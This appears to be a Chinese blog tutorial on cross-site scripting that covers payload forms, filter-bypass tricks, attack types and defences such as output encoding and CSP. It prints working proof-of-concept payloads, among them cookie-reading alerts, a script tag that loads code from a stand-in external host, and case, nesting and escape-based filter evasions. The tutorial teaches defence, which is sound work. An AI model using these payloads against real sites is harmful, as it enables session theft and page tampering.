---
title: 什么是 XSS 攻击
date: 2024-12-25T10:34:39+08:00
author: LiangMingJian
---

# 概述

XSS 的英文全称是 Cross Site Scripting，跨站脚本攻击（为了和层叠样式表 Cascading Style Sheets 的简写 CSS 区分，所以第一个单词替换为 X）。

XSS 是一种常见的网络安全漏洞。攻击者通过在网页 HTML 中注入恶意的 JavaScript 脚本，当其他用户浏览该页面时，JavaScript 脚本会自动在他们的浏览器中执行，从而窃取信息、篡改内容或进行其他恶意操作。

简单来说，XSS 利用网站对用户输入数据验证不足的漏洞。攻击者可以在文本框，输入框这些地方刻意填写 HTML、JavaScript 脚本来作为文本输入，网站对这些输入内容不做处理就直接添加进入 HTML 页面。此时，当网站正常加载时，这些非法的内容也会被加载，同时被自动执行。

# XSS 的攻击载荷

攻击者可以利用下述的这些 HTML 标签作为攻击载荷，在输入框输入恶意的 JavaScript 内容来进行工具。

## script 标签

script 标签是最直接的攻击方式，`<script>` 标签中的内容会在 HTML 加载时会自动执行，因此容易进行攻击。

```html
<script>alert(document.cookie)</script>      # 弹出 cookie
<script src=http://xxx.com/xss.js></script>  # 引用外部的 xss
```

## 标签的事件属性

HTML 标签提供诸如 `onerror`（错误时执行）、`onload`（加载时执行）、`onclick`（点击时执行）的事件属性，当满足特定条件时，执行设置在该属性中的 JavaScript 代码。

```html
<svg onload=alert(document.cookie)>  # 加载时弹出 cookie
<img src=1 οnclick=alert(document.cookie)>  # 点击时弹出 cookie
<img src=1 onerror=alert(document.cookie)>  # 加载失败时弹出 cookie
```

## href 属性的 ‌JavaScript 伪协议

在 `<a>` 标签中的 `href` 属性，支持使用形如 `javascript:` 的 JavaScript 伪协议，当用户点击这个链接时，触发该 JavaScript 代码。

> href 属性不止在 `<a>` 标签中出现，甚至 CSS 中也可以出现，比如 `background:url('javascript:alert(1)')` 通过 CSS 的背景图片参数进行攻击。

```html
<a href='javascript:void(0)'></a>  # 这是正常的应用，阻止链接的默认跳转行为
<a href='javascript:alert(document.cookie)'></a>  # 这是错误的注入行为
```

## URL 的参数

在某些网站中，其可能会通过 `location.hash`，`document.write()`，`innerHTML` 等方式获取 URL 中的参数，并将这些参数加载到指定位置。此时，如果这些参数存在注入内容，则网站会直接加载，然后执行，完成攻击。

比如，URL 传入的一个参数 `#<img src='x' onerror='alert(1)'>`，而网站的代码中又存在这样的内容时，攻击生效。

```javascript
const result = location.hash;  // 获取 URL 井号 # 后面的内容
const element = document.getElementById("myElement");  // 获取一个元素
element.innerHTML = result;  // 在元素中插入 URL 参数。此时因为参数是 <img src='x' onerror='alert(1)'>，所以这个脚本会被加载到网页中，攻击生效
```

注意，HTML 5 中不会执行由 `innerHTML` 插入的 `<script>` 标签，但是像上述通过标签的事件属性来执行的 XSS 攻击仍然可以生效。

# XSS 的绕过方式

## 通过大小写标签绕过标签名判断过滤

```
<scripT>alert('hack')</scripT>
<sCript>alert("hey!")</scRipt>
```

## 通过嵌套的标签绕过标签名判断过滤

```
<scr<script>ipt>alert('hack')</scr</script>ipt>
```

## 通过 eval 编解码脚本绕过关键字过滤

当服务器对代码中的关键字（ 如 alert ）进行过滤时，我们可以尝试将关键字进行编码后再插入，利用方法 `eval()` 将编码过的语句解码后再执行。例如：`alert(1) = eval(\u0061\u006c\u0065\u0072\u0074(1))`

> 通过编解码的方式，不止可以绕过关键字，如果针对 `()`，`<>`，`\` 等符号进行编解码，也可以实现绕过攻击。

```
<script>eval(\u0061\u006c\u0065\u0072\u0074(1))</script>
```

# XSS 的攻击类型

- **存储型 XSS**：恶意代码被永久存储在服务器上，每次有用户访问时都会执行，危害性最大。比如，攻击者在个人信息或发表文章等地方插入代码，后端没有过滤或过滤不严，那么这些代码就会被储存到服务器中，其他任何用户访问该页面时都会触发代码执行。
- **反射型 XSS**：恶意代码作为请求的一部分发送到服务器，服务器将其响应给用户的浏览器并执行，非持久化的攻击。反射型 XSS 需要欺骗用户点击链接才能触发 XSS 代码（因为服务器中没有恶意代码），因此一般容易出现在搜索页面或其他容易存在连接的页面。
- **DOM 型 XSS**：恶意代码通过修改页面的 DOM 结构执行，不涉及服务器。比如上述通过 URL 的参数作为攻击载荷的 XSS 攻击就是典型的 DOM 型 XSS。

# XSS 漏洞的防范

- **验证和过滤输入**‌：后端应对所有用户的输入进行严格验证和过滤，尽可能找到一切用户可控并且能够输出在页面代码中的地方。
- **对输出进行编码**‌：前端在将用户输入输出到页面时，不能直接进行输出，必须进行 HTML 编码。
- **设置安全的 HTTP 头**‌：前端可以使用 HTTP 头信息 `Content-Security-Policy` (CSP) 来限制脚本来源。

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';" />
```
